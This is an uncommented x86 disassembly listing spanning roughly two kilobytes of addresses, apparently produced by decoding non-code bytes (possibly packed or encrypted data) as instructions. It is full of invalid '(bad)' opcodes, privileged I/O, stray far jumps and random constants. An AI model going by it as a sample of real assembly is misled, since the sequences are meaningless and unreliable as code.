  41db7f:	aad    0xe9
  41db81:	add    eax,0x2fe74552
  41db86:	xor    esp,ecx
  41db88:	sbb    ch,BYTE PTR [ebp-0x50]
  41db8b:	lahf   
  41db8c:	daa    
  41db8d:	dec    edi
  41db8e:	lds    ecx,FWORD PTR [ebp+0x254e18f4]
  41db94:	xor    DWORD PTR [esi+0x42bab8ef],ecx
  41db9a:	repz cmp ebp,DWORD PTR [esi+esi*8-0x71]
  41db9f:	xchg   ebx,eax
  41dba0:	cmp    BYTE PTR [esi+0x2e],al
  41dba3:	pop    ebp
  41dba4:	out    dx,eax
  41dba5:	push   eax
  41dba6:	jmp    0x41dc19
  41dba8:	mov    esi,0x35d245fc
  41dbad:	inc    ebp
  41dbae:	test   al,0xb4
  41dbb0:	dec    edi
  41dbb1:	ret    
  41dbb2:	or     BYTE PTR [edi],al
  41dbb4:	or     BYTE PTR [esi-0x79],0x56
  41dbb8:	fmul   QWORD PTR [eax+0x55b313a5]
  41dbbe:	inc    ebx
  41dbbf:	cmp    ebx,DWORD PTR [ecx+0x46]
  41dbc2:	xchg   esp,eax
  41dbc3:	addr16 not dh
  41dbc6:	cmp    eax,0xe15f9813
  41dbcb:	jbe    0x41dbec
  41dbcd:	sub    BYTE PTR [ebx],0x2d
  41dbd0:	inc    esp
  41dbd1:	or     BYTE PTR [eax],dl
  41dbd3:	and    eax,0xaa00bce3
  41dbd8:	mov    DWORD PTR [edx+0x19],eax
  41dbdb:	push   eax
  41dbdc:	repnz imul esi,DWORD PTR [edi-0x6407b5d6],0xe15b5a73
  41dbe7:	cmp    al,0x2e
  41dbe9:	sbb    BYTE PTR [eax],cl
  41dbeb:	fnstsw WORD PTR [esi]
  41dbed:	std    
  41dbee:	or     al,0xa5
  41dbf0:	lahf   
  41dbf1:	push   esp
  41dbf2:	mov    ds:0x4bd45d87,eax
  41dbf7:	pop    eax
  41dbf8:	repnz mov dh,dh
  41dbfb:	sub    DWORD PTR [ecx],0xffffff81
  41dbfe:	mov    esp,0xbc5ca948
  41dc03:	dec    esi
  41dc04:	clc    
  41dc05:	in     al,0x17
  41dc07:	(bad)  
  41dc08:	loopne 0x41dbb0
  41dc0a:	ja     0x41dc40
  41dc0c:	adc    esi,ebp
  41dc0e:	mov    bh,0x77
  41dc10:	sbb    eax,0xc87aa26c
  41dc15:	vpunpckhdq ymm1,ymm6,YMMWORD PTR [esp+ebx*2]
  41dc1a:	inc    eax
  41dc1b:	dec    edx
  41dc1c:	push   0x3fb79566
  41dc21:	aaa    
  41dc22:	sbb    ah,cl
  41dc24:	int    0x12
  41dc26:	(bad)  
  41dc27:	aaa    
  41dc28:	ror    DWORD PTR [ebx],cl
  41dc2a:	mov    eax,ds:0x55134407
  41dc2f:	in     al,0x5d
  41dc31:	mov    BYTE PTR [edi+0x1],cl
  41dc34:	sbb    edi,DWORD PTR [ecx+0x54]
  41dc37:	rcr    edx,cl
  41dc39:	mov    edx,0xe75c7ed7
  41dc3e:	fdiv   DWORD PTR [eax]
  41dc40:	and    BYTE PTR [ebx-0x731f4e65],0x42
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	cmp    eax,0xf63528f7
  41dc4d:	in     eax,dx
  41dc4e:	inc    edi
  41dc4f:	in     eax,dx
  41dc50:	inc    esi
  41dc51:	xchg   ecx,eax
  41dc52:	test   BYTE PTR [edi-0x2b],0xca
  41dc56:	push   0xffffffe4
  41dc58:	and    al,0xbb
  41dc5a:	(bad)  
  41dc5b:	mov    ebx,ebx
  41dc5d:	in     al,dx
  41dc5e:	mov    ecx,0x8c54a52c
  41dc63:	lods   al,BYTE PTR ds:[esi]
  41dc64:	pusha  
  41dc65:	repz pop ebp
  41dc67:	xchg   ebp,eax
  41dc68:	inc    esi
  41dc69:	dec    ecx
  41dc6a:	sub    edx,DWORD PTR [ebx+0x637c77e9]
  41dc70:	iret   
  41dc71:	dec    eax
  41dc72:	adc    al,0xcb
  41dc74:	sub    DWORD PTR [edx-0x11],ecx
  41dc77:	cmp    cl,bh
  41dc79:	push   edx
  41dc7a:	inc    esi
  41dc7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7c:	push   esi
  41dc7d:	cmp    edi,ecx
  41dc7f:	out    dx,al
  41dc80:	push   ecx
  41dc81:	jae    0x41dca2
  41dc83:	daa    
  41dc84:	scas   al,BYTE PTR es:[edi]
  41dc85:	int3   
  41dc86:	mov    dh,BYTE PTR ds:0x1cd0576c
  41dc8c:	xchg   dh,al
  41dc8e:	aas    
  41dc8f:	loope  0x41dccd
  41dc91:	aas    
  41dc92:	in     al,0xd3
  41dc94:	cs add ebp,esi
  41dc97:	jo     0x41dc66
  41dc99:	sbb    eax,0x5203200d
  41dc9e:	lock outs dx,DWORD PTR ds:[esi]
  41dca0:	test   ebx,edx
  41dca2:	add    ebp,DWORD PTR [edi-0x25d636ac]
  41dca8:	popf   
  41dca9:	and    ebp,DWORD PTR [si]
  41dcac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcad:	mov    al,ds:0xa43acd4e
  41dcb2:	pop    ecx
  41dcb3:	hlt    
  41dcb4:	inc    esp
  41dcb5:	int3   
  41dcb6:	mov    edx,0x55184b68
  41dcbc:	gs stos BYTE PTR es:[edi],al
  41dcbe:	push   ecx
  41dcbf:	inc    edx
  41dcc0:	mov    dl,0x2b
  41dcc2:	in     al,dx
  41dcc3:	(bad)  
  41dcc4:	push   edx
  41dcc5:	mov    ch,0x95
  41dcc7:	cmp    dh,ah
  41dcc9:	mov    ds:0x5c719a87,eax
  41dcce:	hlt    
  41dccf:	sub    al,0x7d
  41dcd1:	cmc    
  41dcd2:	out    0x79,eax
  41dcd4:	and    bh,al
  41dcd6:	popa   
  41dcd7:	ja     0x41dc7a
  41dcd9:	aaa    
  41dcda:	jmp    0xa1e9394d
  41dcdf:	mov    edx,0xf74044d4
  41dce4:	aam    0x22
  41dce6:	fdivr  st,st(2)
  41dce8:	outs   dx,DWORD PTR ds:[esi]
  41dce9:	(bad)  
  41dceb:	cld    
  41dcec:	lds    edx,FWORD PTR [eax-0x29]
  41dcef:	jmp    0x41dcd8
  41dcf1:	lahf   
  41dcf2:	int3   
  41dcf3:	repnz xchg esi,eax
  41dcf5:	or     ebp,DWORD PTR [edx-0x47a37bb4]
  41dcfb:	xor    esp,DWORD PTR [ebx+0x396b4e3c]
  41dd01:	mov    eax,0xaa57d432
  41dd06:	loope  0x41dd46
  41dd08:	cmp    eax,0x744eab70
  41dd0d:	mov    ebx,0x33920f3
  41dd12:	and    al,0x35
  41dd14:	mov    eax,0xaddcbd5b
  41dd19:	cs pop esp
  41dd1b:	pop    es
  41dd1c:	out    dx,eax
  41dd1d:	ins    DWORD PTR es:[edi],dx
  41dd1e:	jmp    0xc76d:0xe2763fa3
  41dd25:	mov    ah,0x83
  41dd27:	jae    0x41dd0a
  41dd29:	cs enter 0x959e,0x9d
  41dd2e:	mov    dl,0x70
  41dd30:	call   0x1990fc3d
  41dd35:	in     al,0x4b
  41dd37:	out    0x83,al
  41dd39:	aam    0x4d
  41dd3b:	dec    edx
  41dd3c:	cmp    BYTE PTR [edi+0x3211e48c],bl
  41dd42:	or     ebx,DWORD PTR [edi+0x6bf7cac0]
  41dd48:	repz std 
  41dd4a:	adc    BYTE PTR [esi+ebx*4],cl
  41dd4d:	mov    dl,0xe3
  41dd4f:	mov    ah,0x1d
  41dd51:	hlt    
  41dd52:	mov    dh,0x3c
  41dd54:	mov    ds:0xf8d13926,al
  41dd59:	(bad)  [ebp+0x2b]
  41dd5c:	xchg   ebp,eax
  41dd5d:	por    mm1,QWORD PTR [ebx+eax*8-0x4e]
  41dd62:	(bad)  
  41dd63:	into   
  41dd64:	icebp  
  41dd65:	aaa    
  41dd66:	cwde   
  41dd67:	mov    dh,0xc5
  41dd69:	loope  0x41dd07
  41dd6b:	mov    ah,BYTE PTR [edx+ebx*1+0x4]
  41dd6f:	sar    ecx,cl
  41dd71:	mov    ds:0xfecffde0,al
  41dd76:	inc    eax
  41dd77:	lock jmp 0x41dd4a
  41dd7a:	xor    al,0x4e
  41dd7c:	hlt    
  41dd7d:	fs sbb eax,0xafe41aed
  41dd83:	cmp    eax,0xca8bb6d9
  41dd88:	xor    BYTE PTR [eax],dl
  41dd8a:	in     eax,0x75
  41dd8c:	cli    
  41dd8d:	out    0xc0,al
  41dd8f:	cs pop ss
  41dd91:	mov    ah,0xa9
  41dd93:	js     0x41ddf5
  41dd95:	rcr    DWORD PTR ds:0xf7ebabf,0x63
  41dd9c:	mov    bh,0xe6
  41dd9e:	lods   eax,DWORD PTR ds:[esi]
  41dd9f:	fild   WORD PTR [esi]
  41dda1:	sbb    ebx,DWORD PTR [esi-0x64e828f7]
  41dda7:	push   es
  41dda8:	xor    DWORD PTR [esi+0x7a17ce86],esi
  41ddae:	inc    ebp
  41ddaf:	ror    DWORD PTR [edi-0xe9de88f],cl
  41ddb5:	test   eax,0x49ec6971
  41ddba:	jl     0x41ddad
  41ddbc:	sti    
  41ddbd:	inc    edi
  41ddbe:	or     DWORD PTR [ecx],ebp
  41ddc0:	pusha  
  41ddc1:	iret   
  41ddc2:	(bad)  
  41ddc4:	and    al,BYTE PTR [ebx]
  41ddc6:	push   ebp
  41ddc7:	and    ebp,eax
  41ddc9:	call   0x5cc1:0x6a88bbae
  41ddd0:	pop    ds
  41ddd1:	ret    0xcb1f
  41ddd4:	sbb    DWORD PTR [eax+0x35],esi
  41ddd7:	cmp    esp,DWORD PTR ds:0xf09eaeb2
  41dddd:	imul   esp,DWORD PTR [ebx+0x76],0xb3a13751
  41dde4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde5:	(bad)  
  41dde6:	aaa    
  41dde7:	mov    al,0x87
  41dde9:	out    dx,eax
  41ddea:	bound  ecx,QWORD PTR [edi-0x6f]
  41dded:	push   0x3e
  41ddef:	add    DWORD PTR [edx+0x6e],ecx
  41ddf2:	shr    BYTE PTR [ecx+0x3a],1
  41ddf5:	inc    edi
  41ddf6:	push   ds
  41ddf7:	fistp  QWORD PTR [ecx+eiz*1]
  41ddfa:	pushf  
  41ddfb:	xor    edx,edi
  41ddfd:	cwde   
  41ddfe:	pop    ds
  41ddff:	hlt    
  41de00:	dec    ecx
  41de01:	cld    
  41de02:	cmp    BYTE PTR [ebx+0x2a0dcb4e],dh
  41de08:	stc    
  41de09:	ins    DWORD PTR es:[edi],dx
  41de0a:	mov    bl,0xcc
  41de0c:	or     ch,ch
  41de0e:	pop    ebx
  41de0f:	pop    ds
  41de10:	adc    BYTE PTR [ebx],0x66
  41de13:	jmp    0x41dddf
  41de15:	sbb    ebx,esi
  41de17:	pop    esp
  41de18:	push   esp
  41de19:	lea    edx,[esi+0x2d]
  41de1c:	jne    0x41de47
  41de1e:	cmp    ecx,ebx
  41de20:	lds    ecx,FWORD PTR [ebx]
  41de22:	mov    bh,0x1d
  41de24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de25:	push   esi
  41de26:	test   edi,esp
  41de28:	imul   ebp,DWORD PTR [edi+0x376ac695],0x96f0740c
  41de32:	jbe    0x41ddeb
  41de34:	(bad)  
  41de35:	mov    dl,0x9
  41de37:	mov    cl,0xff
  41de39:	inc    eax
  41de3a:	mov    edx,0xd86f1b65
  41de3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de40:	and    DWORD PTR [ecx-0x16341ae],ebx
  41de46:	daa    
  41de47:	or     BYTE PTR [edx],bl
  41de49:	adc    ch,cl
  41de4b:	xchg   esp,eax
  41de4c:	xor    al,0x98
  41de4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de4f:	ds pop edi
  41de51:	aam    0x65
  41de53:	xlat   BYTE PTR ds:[ebx]
  41de54:	jmp    0x588dbc6a
  41de59:	sub    DWORD PTR [edi-0x6],edx
  41de5c:	lock loop 0x41de3c
  41de5f:	and    dl,BYTE PTR [ecx-0x29e9cfc0]
  41de65:	mov    ds,WORD PTR [ecx+0x5eb85223]
  41de6b:	dec    esi
  41de6c:	dec    eax
  41de6d:	mov    eax,ds:0x120a532f
  41de72:	inc    edx
  41de73:	and    al,0x81
  41de75:	xchg   ecx,eax
  41de76:	ss popf 
  41de78:	cmp    BYTE PTR [edx+0x2a453a9d],dh
  41de7e:	icebp  
  41de7f:	jne    0x41de18
  41de81:	jmp    0xb4f4:0xcdf1a3f1
  41de88:	sub    al,0x8a
  41de8a:	mov    dl,0xa2
  41de8c:	jge    0x41de34
  41de8e:	into   
  41de8f:	ret    0xfcab
  41de92:	fbstp  TBYTE PTR [eax-0x4a]
  41de95:	stos   DWORD PTR es:[edi],eax
  41de96:	push   es
  41de97:	cmp    esp,ebx
  41de99:	test   DWORD PTR [esi-0x1163cae7],ebp
  41de9f:	push   ecx
  41dea0:	pop    ebp
  41dea1:	adc    eax,0xd07c5c5c
  41dea6:	cwde   
  41dea7:	ficom  WORD PTR [edx]
  41dea9:	jl     0x41dea7
  41deab:	cmp    DWORD PTR [eax+0x5e],ebx
  41deae:	jl     0x41de5b
  41deb0:	and    al,0x21
  41deb2:	test   BYTE PTR [edx],bl
  41deb4:	lds    edi,FWORD PTR [ecx]
  41deb6:	lea    ebp,[ebx-0x2ec78b54]
  41debc:	adc    ebp,eax
  41debe:	xor    eax,0x3a7ddc48
  41dec3:	pop    ebp
  41dec4:	push   0xb049772e
  41dec9:	jmp    0x41de5a
  41decb:	bnd jl 0x41deb9
  41dece:	push   edi
  41decf:	faddp  st(7),st
  41ded1:	xor    eax,esi
  41ded3:	inc    esp
  41ded4:	sti    
  41ded5:	jmp    0x91decfac
  41deda:	sti    
  41dedb:	aad    0xb1
  41dedd:	and    BYTE PTR [eax-0x23c944c5],ah
  41dee3:	call   0xd3476114
  41dee8:	(bad)  
  41dee9:	outs   dx,DWORD PTR ds:[esi]
  41deea:	rcl    DWORD PTR [ecx-0x587125a5],1
  41def0:	or     eax,esi
  41def2:	out    0xc,eax
  41def4:	shl    BYTE PTR [ebp-0xeb63a15],0x8d
  41defb:	ss test cl,al
  41defe:	mov    eax,0xeb137d5c
  41df03:	popf   
  41df04:	outs   dx,BYTE PTR ds:[esi]
  41df05:	xor    ecx,DWORD PTR [esi+ecx*1+0x4]
  41df09:	adc    ebp,DWORD PTR [edx]
  41df0b:	aaa    
  41df0c:	inc    esp
  41df0d:	jae    0x41df77
  41df0f:	sub    edi,esi
  41df11:	mov    eax,ds:0x42fff58c
  41df16:	xor    ecx,0xffffffb7
  41df19:	lods   eax,DWORD PTR ds:[esi]
  41df1a:	popf   
  41df1b:	cdq    
  41df1c:	inc    edi
  41df1d:	rcl    BYTE PTR [ecx-0x25],cl
  41df20:	fadd   DWORD PTR [edx+edx*1+0x26b782ac]
  41df27:	sub    eax,0x1acdae0b
  41df2c:	aas    
  41df2d:	push   ecx
  41df2e:	int3   
  41df2f:	test   al,0x4f
  41df31:	dec    esp
  41df32:	fcomp  QWORD PTR [esi-0x6e]
  41df35:	sbb    edi,DWORD PTR [ecx-0x1c]
  41df38:	dec    eax
  41df39:	sub    eax,DWORD PTR [edx+0x2ee52d95]
  41df3f:	fucomi st,st(2)
  41df41:	pmullw mm7,QWORD PTR [ecx-0x72b3b37b]
  41df48:	fiadd  DWORD PTR [edi-0x42]
  41df4b:	or     cl,BYTE PTR [ebp+0x49]
  41df4e:	jno    0x41df86
  41df50:	cmp    bh,BYTE PTR [edi+0x2deabade]
  41df56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df57:	xchg   edx,eax
  41df58:	fsub   QWORD PTR [edi+0x18]
  41df5b:	adc    al,0x20
  41df5d:	or     eax,0x332d90df
  41df62:	push   edi
  41df63:	mov    bl,0xb
  41df65:	pop    es
  41df66:	test   al,0xc9
  41df68:	or     ecx,DWORD PTR [esi+0x3a718665]
  41df6e:	xor    ecx,DWORD PTR [ecx+0x63]
  41df71:	aaa    
  41df72:	sbb    cl,BYTE PTR [eax]
  41df74:	mov    esi,0xf79fc6ba
  41df79:	addr16 mov bh,0x71
  41df7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df7d:	or     eax,0x99af9ac2
  41df82:	shl    DWORD PTR [ebx-0x69a88eaf],0x37
  41df89:	mov    eax,ds:0xdd80f6c2
  41df8e:	dec    ebp
  41df8f:	(bad)  
  41df90:	mov    edx,0x7e803eb4
  41df95:	push   ebx
  41df96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df97:	out    0x4c,eax
  41df99:	into   
  41df9a:	(bad)  
  41df9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9c:	rol    DWORD PTR [edi],cl
  41df9e:	cmp    ecx,0xdc88e8b1
  41dfa4:	dec    eax
  41dfa5:	mov    eax,0x51ed279
  41dfaa:	xchg   ecx,eax
  41dfab:	mov    ds:0x388ea582,eax
  41dfb0:	mov    al,0x9f
  41dfb2:	adc    dh,BYTE PTR [eax]
  41dfb4:	inc    ebp
  41dfb5:	cmp    al,0xb4
  41dfb7:	or     ebp,eax
  41dfb9:	adc    al,0xfa
  41dfbb:	cmp    eax,0x5b8745c4
  41dfc0:	or     BYTE PTR ds:0x63838304,0x55
  41dfc7:	and    BYTE PTR [edi+eiz*8+0x3e0887ac],ah
  41dfce:	es (bad) 
  41dfd0:	es (bad) 
  41dfd2:	push   edi
  41dfd3:	push   ebp
  41dfd4:	sbb    ebp,edi
  41dfd6:	pop    edi
  41dfd7:	outs   dx,DWORD PTR ds:[esi]
  41dfd8:	call   0x11f13146
  41dfdd:	adc    al,0xdb
  41dfdf:	sbb    ah,al
  41dfe1:	cmc    
  41dfe2:	jo     0x41e00b
  41dfe4:	bound  esi,QWORD PTR [ebp+edi*4+0x48916f09]
  41dfeb:	jne    0x41df9e
  41dfed:	mov    ebx,0x94d3494f
  41dff2:	lock mov ds:0xf38618b5,al
  41dff8:	push   esp
  41dff9:	add    al,0x1c
  41dffb:	repnz lahf 
  41dffd:	push   esi
  41dffe:	mov    DWORD PTR [edi-0x70abf55d],ebp
  41e004:	xchg   ecx,eax
  41e005:	push   0xfb8e029
  41e00a:	sbb    al,0xba
  41e00c:	cmp    DWORD PTR [eax+esi*4],edi
  41e00f:	mov    eax,0xa6280168
  41e014:	pusha  
  41e015:	push   cs
  41e016:	mov    gs,WORD PTR [esp+ecx*4]
  41e019:	shr    BYTE PTR [ebp+0x1940aee4],cl
  41e01f:	sub    edx,DWORD PTR [esi-0x1d]
  41e022:	mov    ds:0x2434d4d2,al
  41e027:	cmp    al,0x71
  41e029:	loope  0x41e03c
  41e02b:	(bad)  
  41e02c:	fsubr  DWORD PTR [eax]
  41e02e:	add    ch,dl
  41e030:	inc    ebx
  41e031:	pop    eax
  41e032:	imul   edi,DWORD PTR [ebx],0x17cbf49
  41e038:	cs inc edi
  41e03a:	xor    eax,0x1458cae7
  41e03f:	lock adc eax,DWORD PTR cs:[ebx-0x53]
  41e044:	(bad)
  41e047:	or     al,0x4b
  41e049:	mov    ?,WORD PTR [ebx+esi*1+0x1b6c78bd]
  41e050:	mov    al,ds:0xff3702f9
  41e055:	jo     0x41e0d1
  41e057:	dec    ebp
  41e058:	test   eax,0xcad32e9a
  41e05d:	test   DWORD PTR [eax-0x26],eax
  41e060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e061:	pop    ds
  41e062:	(bad)  
  41e063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e064:	fiadd  WORD PTR [esp+ebx*1+0x5e9b999f]
  41e06b:	lds    edx,FWORD PTR [edx-0x50]
  41e06e:	xor    DWORD PTR [eax],0xf56b972b
  41e074:	mov    WORD PTR [ebp-0x68],ds
  41e077:	nop
  41e078:	cmp    esp,DWORD PTR [eax+0x7e]
  41e07b:	retf   0xfd4a
  41e07e:	fwait
  41e07f:	outs   dx,BYTE PTR ds:[esi]
  41e080:	(bad)  
  41e081:	push   ss
  41e082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e083:	sbb    BYTE PTR [edx],bh
  41e085:	jnp    0x41e076
  41e087:	loope  0x41e0b9
  41e089:	hlt    
  41e08a:	stos   DWORD PTR es:[edi],eax
  41e08b:	test   DWORD PTR [ebx*2+0x7378e2bf],0x1f197c8a
  41e096:	call   0xd627382c
  41e09b:	jle    0x41e04d
  41e09d:	sbb    BYTE PTR [ecx],dl
  41e09f:	xor    edi,DWORD PTR [ecx+0x73521c86]
  41e0a5:	push   eax
  41e0a6:	push   ss
  41e0a7:	ds icebp 
  41e0a9:	pop    edx
  41e0aa:	xchg   edx,eax
  41e0ab:	push   edi
  41e0ac:	xchg   DWORD PTR [ecx-0x7a5ac1a7],esp
  41e0b2:	fidivr WORD PTR [edi+0x2b]
  41e0b5:	mov    al,ds:0x46e07cbb
  41e0ba:	pushf  
  41e0bb:	adc    al,0xf9
  41e0bd:	in     al,0x63
  41e0bf:	out    0x6a,al
  41e0c1:	int    0xd5
  41e0c3:	ss rol eax,0xfa
  41e0c7:	jne    0x41e0b5
  41e0c9:	mov    edx,0x49db018a
  41e0ce:	mov    esi,0x4e737bbc
  41e0d3:	(bad)  
  41e0d5:	sub    ch,bh
  41e0d7:	das    
  41e0d8:	jge    0x41e0ba
  41e0da:	retf   0xb5ef
  41e0dd:	lods   eax,DWORD PTR ds:[esi]
  41e0de:	outs   dx,BYTE PTR ds:[esi]
  41e0df:	mov    esi,0x6b1be6e0
  41e0e4:	adc    BYTE PTR [eax+0xae560a4],ah
  41e0ea:	in     al,dx
  41e0eb:	jb     0x41e149
  41e0ed:	push   ebp
  41e0ee:	aad    0xdb
  41e0f0:	or     eax,0x57ddafca
  41e0f5:	or     BYTE PTR [ebp-0x4ddbe28f],cl
  41e0fb:	sbb    BYTE PTR [esi-0x6],dh
  41e0fe:	inc    edi
  41e0ff:	inc    edx
  41e100:	bswap  ebx
  41e102:	lds    ebx,FWORD PTR [edi+0x14]
  41e105:	or     DWORD PTR [eax-0x7d],0x3f
  41e109:	clc    
  41e10a:	or     bh,BYTE PTR [ebx-0x6c7b5e58]
  41e110:	cmp    dl,bh
  41e112:	fst    QWORD PTR [esi+0xc]
  41e115:	aad    0x55
  41e117:	std    
  41e118:	mov    al,0x23
  41e11a:	(bad)  
  41e11b:	iret   
  41e11c:	outs   dx,DWORD PTR ds:[esi]
  41e11d:	jle    0x41e157
  41e11f:	dec    ebp
  41e120:	cmp    ch,BYTE PTR [esi]
  41e122:	xchg   esi,eax
  41e123:	test   al,0x86
  41e125:	mov    ah,0xb1
  41e127:	imul   esi,DWORD PTR [edx+ebp*4],0x28
  41e12b:	mov    al,0x85
  41e12d:	fidivr DWORD PTR [esi+0x5]
  41e130:	pop    edx
  41e131:	or     eax,0xabfa15e0
  41e136:	retf   
  41e137:	iret   
  41e138:	xchg   edi,eax
  41e139:	outs   dx,BYTE PTR ds:[esi]
  41e13a:	fwait
  41e13b:	jo     0x41e150
  41e13d:	sbb    al,BYTE PTR [esi+0x8]
  41e140:	sub    DWORD PTR [ebp-0x5fa496b2],esp
  41e146:	vmread eax,esp
  41e149:	test   DWORD PTR [edx],ebp
  41e14b:	cmp    edi,eax
  41e14d:	popf   
  41e14e:	inc    esp
  41e14f:	push   edx
  41e150:	pop    ebx
  41e152:	loopne 0x41e109
  41e154:	xchg   edi,eax
  41e155:	jmp    0xf3797c33
  41e15a:	push   es
  41e15b:	cmp    eax,0x4d24323f
  41e160:	xor    bh,BYTE PTR [esi+0x42]
  41e163:	push   esi
  41e164:	sbb    al,0xcf
  41e166:	ror    ecx,0xf6
  41e169:	sub    BYTE PTR ds:0x4a3e7a79,cl
  41e16f:	inc    edx
  41e170:	add    DWORD PTR [eax-0x14],0x0
  41e174:	add    edx,DWORD PTR [esi]
  41e176:	mov    WORD PTR [ebx-0x3d],gs
  41e179:	outs   dx,BYTE PTR ds:[esi]
  41e17a:	iret   
  41e17b:	cmp    eax,0x9285e826
  41e180:	ds jnp 0x41e18f
  41e183:	jge    0x41e1f0
  41e185:	cmp    DWORD PTR [edx],0x2a
  41e188:	add    DWORD PTR [ecx+0xef0cee5],edi
  41e18e:	in     al,0x49
  41e190:	jae    0x41e1e7
  41e192:	cdq    
  41e193:	cs stos DWORD PTR es:[edi],eax
  41e195:	pop    esi
  41e196:	push   ds
  41e197:	xor    eax,0xcf0a0c02
  41e19c:	stc    
  41e19d:	pop    es
  41e19e:	dec    edx
  41e19f:	js     0x41e1e3
  41e1a1:	lock into 
  41e1a3:	(bad)  
  41e1a4:	in     eax,0x35
  41e1a6:	adc    esi,DWORD PTR [eax]
  41e1a8:	push   esi
  41e1a9:	dec    ebx
  41e1aa:	cmp    DWORD PTR ds:0xb40c1c7,edi
  41e1b0:	aad    0xd8
  41e1b2:	add    dl,BYTE PTR [eax+edx*8+0x29]
  41e1b6:	fist   WORD PTR [eax]
  41e1b8:	aad    0x71
  41e1ba:	push   edx
  41e1bb:	push   0xffffffb4
  41e1bd:	xchg   esi,eax
  41e1be:	add    ah,ah
  41e1c0:	xlat   BYTE PTR ds:[ebx]
  41e1c1:	xchg   ebx,eax
  41e1c2:	shl    BYTE PTR [edi+ebp*8],1
  41e1c5:	nop
  41e1c6:	out    dx,al
  41e1c7:	fs icebp 
  41e1c9:	imul   ecx,DWORD PTR [ecx-0x79],0xffffffb7
  41e1cd:	jb     0x41e16f
  41e1cf:	jg     0x41e154
  41e1d1:	in     al,dx
  41e1d2:	and    dh,ch
  41e1d4:	jmp    0x65005044
  41e1d9:	lahf   
  41e1da:	(bad)  
  41e1db:	and    BYTE PTR [eax-0x5fa6b00a],ah
  41e1e1:	mov    al,0x7c
  41e1e3:	ror    DWORD PTR gs:[ebp-0x3eb33d67],cl
  41e1ea:	fadd   QWORD PTR ds:[eax-0x6]
  41e1ee:	neg    edi
  41e1f0:	aam    0xda
  41e1f2:	rcr    DWORD PTR [ebp+0x52ede16e],0x3c
  41e1f9:	fld    DWORD PTR [edi+0x66]
  41e1fc:	scas   al,BYTE PTR es:[edi]
  41e1fd:	lods   eax,DWORD PTR ds:[esi]
  41e1fe:	jge    0x41e206
  41e200:	pushf  
  41e201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e202:	mov    ds:0x7e7ffca7,al
  41e207:	pushf  
  41e208:	aad    0x7d
  41e20a:	lods   eax,DWORD PTR ds:[esi]
  41e20b:	push   cs
  41e20c:	push   0x2dc9f08d
  41e211:	iret   
  41e212:	and    eax,0x7e329790
  41e217:	add    eax,0xd2cab337
  41e21c:	cmc    
  41e21d:	cmp    eax,0x1a4143d5
  41e222:	pop    es
  41e223:	sub    edi,DWORD PTR [eax+0x59]
  41e226:	stos   DWORD PTR es:[edi],eax
  41e227:	xor    dl,cl
  41e229:	xchg   esi,eax
  41e22a:	xchg   DWORD PTR [ebx+0x77],eax
  41e22d:	and    dh,BYTE PTR [edx+0x3e8254fb]
  41e233:	jo     0x41e29f
  41e235:	xchg   ebx,eax
  41e236:	xchg   BYTE PTR [eax+0x2d],ch
  41e239:	mov    esi,0x6889ddce
  41e23e:	pop    ebx
  41e23f:	aad    0x99
  41e241:	les    esp,FWORD PTR [ebp+0x9]
  41e244:	xchg   ecx,eax
  41e245:	push   0xa1e0ef73
  41e24a:	jnp    0x41e1d3
  41e24c:	inc    edx
  41e24d:	adc    edx,edx
  41e24f:	jge    0x41e2b1
  41e251:	add    edi,ebx
  41e253:	jmp    0x36a70308
  41e258:	imul   eax,DWORD PTR [ecx],0xffffff81
  41e25b:	pop    edx
  41e25c:	fcomi  st,st(0)
  41e25e:	idiv   BYTE PTR [ebx-0x61]
  41e261:	leave  
  41e262:	fidivr DWORD PTR [eax+edi*8-0x41c71836]
  41e269:	sbb    al,0x8f
  41e26b:	fs pop edx
  41e26d:	inc    esp
  41e26e:	sar    DWORD PTR [eax*2+0x456f14d6],1
  41e275:	inc    ebx
  41e276:	pop    ss
  41e277:	arpl   WORD PTR [ecx-0x3ec3ac7f],di
  41e27d:	mov    ds:0x8e2b1e10,al
  41e282:	cmp    DWORD PTR [edx],0xffffffb0
  41e285:	lea    edi,[ecx+0x536f90a4]
  41e28b:	jmp    0xa67f8ba8
  41e290:	push   es
  41e291:	mov    BYTE PTR [edi-0x1],cl
  41e294:	add    BYTE PTR [eax],dh
  41e296:	aad    0xbe
  41e298:	stc    
  41e299:	pop    esp
  41e29a:	push   eax
  41e29b:	(bad)  
  41e29c:	stos   DWORD PTR es:[edi],eax
  41e29d:	lds    ecx,FWORD PTR [edx+0x758e1421]
  41e2a3:	pop    ecx
  41e2a4:	mov    ch,0xb2
  41e2a6:	aam    0xe3
  41e2a8:	sbb    ch,ch
  41e2aa:	fsub   DWORD PTR [ecx-0x765a6ece]
  41e2b0:	nop
  41e2b1:	dec    eax
  41e2b2:	inc    ebx
  41e2b3:	adc    al,0xd
  41e2b5:	jle    0x41e250
  41e2b7:	ss inc ebp
  41e2b9:	icebp  
  41e2ba:	push   ebp
  41e2bb:	fsub   st,st(4)
  41e2bd:	mov    bl,0xf8
  41e2bf:	pop    es
  41e2c0:	retf   
  41e2c1:	sbb    al,0xd7
  41e2c3:	loop   0x41e296
  41e2c5:	sub    bh,BYTE PTR [ebx]
  41e2c7:	jmp    0xa8f5:0xd5b4ad8c
  41e2ce:	pushf  
  41e2cf:	or     BYTE PTR [edx+0x2f],al
  41e2d2:	hlt    
  41e2d3:	popa   
  41e2d4:	push   es
  41e2d5:	dec    edi
  41e2d6:	mov    ch,0x19
  41e2d8:	xchg   ebp,eax
  41e2d9:	loope  0x41e331
  41e2db:	jge    0x41e347
  41e2dd:	mov    ah,0x8e
  41e2df:	cmc    
  41e2e0:	inc    esp
